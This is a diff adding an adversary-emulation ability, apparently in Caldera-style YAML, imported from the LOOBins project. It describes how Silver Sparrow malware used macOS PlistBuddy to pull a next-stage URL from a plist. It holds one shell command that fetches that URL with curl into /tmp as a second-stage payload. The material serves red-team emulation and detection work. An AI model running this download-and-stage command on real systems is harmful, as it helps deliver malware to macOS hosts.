@@ -1,0 +1,31 @@
+- id: 9abc27df-64fd-f72e-3b54-f66795f2f5f2
+  name: PlistBuddy - Read a downloadUrl key with PlistBuddy and fetch the next stage
+  description: Silver Sparrow fetched a JSON config from its C2 and converted it to a plist (with plutil)
+    so PlistBuddy could query it instead of an attacker-authored parser. Print pulls the next-stage URL
+    from :downloadUrl, which is substituted into a curl command for the next stage. Reading properties
+    from a signed Apple binary's output keeps the parsing logic off the host. No privileges required.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    darwin:
+      sh:
+        command: curl "$(/usr/libexec/PlistBuddy -c "Print :downloadUrl" /tmp/version.plist)" --output
+          /tmp/<STAGE_TWO>
+  singleton: false
+  privilege: User
+  repeatable: true
+  delete_payload: false
+  buckets:
+  - loobins
+  - plistbuddy
+  - command-and-control
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: PlistBuddy
+    use_case: Read a downloadUrl key with PlistBuddy and fetch the next stage
+    source_file: PlistBuddy.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2026-10-12T08:33:56.299078Z'
